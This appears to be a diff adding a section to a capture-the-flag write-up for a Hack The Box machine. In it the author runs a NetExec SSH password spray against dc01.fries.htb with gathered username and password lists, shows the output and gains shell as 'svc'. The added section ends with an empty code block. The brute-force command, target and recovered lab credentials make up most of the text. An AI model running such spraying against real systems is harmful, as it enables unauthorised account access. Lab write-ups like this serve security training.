@@ -603,5 +603,31 @@ PsqLR00tpaSS11
 y0st528wn1idjk3b9a
 ```
 
+So now i have a usernames and passwords list, ill do a brute force
+
+```python
+nxc ssh dc01.fries.htb -u usernames.txt -p passwords.txt --continue-on-success
+SSH         10.129.244.72   22     dc01.fries.htb   [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
+SSH         10.129.244.72   22     dc01.fries.htb   [-] root:D4LE11maan!!
+SSH         10.129.244.72   22     dc01.fries.htb   [-] svc:D4LE11maan!!
+SSH         10.129.244.72   22     dc01.fries.htb   [-] administrator:D4LE11maan!!
+SSH         10.129.244.72   22     dc01.fries.htb   [-] d.cooper:D4LE11maan!!
+SSH         10.129.244.72   22     dc01.fries.htb   [-] root:Friesf00Ds2025!!
+SSH         10.129.244.72   22     dc01.fries.htb   [+] svc:Friesf00Ds2025!!  Linux - Shell access!
+SSH         10.129.244.72   22     dc01.fries.htb   [-] administrator:Friesf00Ds2025!!
+SSH         10.129.244.72   22     dc01.fries.htb   [-] d.cooper:Friesf00Ds2025!!
+SSH         10.129.244.72   22     dc01.fries.htb   [-] root:PsqLR00tpaSS11
+SSH         10.129.244.72   22     dc01.fries.htb   [-] administrator:PsqLR00tpaSS11
+SSH         10.129.244.72   22     dc01.fries.htb   [-] d.cooper:PsqLR00tpaSS11
+SSH         10.129.244.72   22     dc01.fries.htb   [-] root:y0st528wn1idjk3b9a
+SSH         10.129.244.72   22     dc01.fries.htb   [-] d.cooper:y0st528wn1idjk3b9a
+```
+
+I have shell access for a user `svc`
+
+```python
+
+```
+
 
 
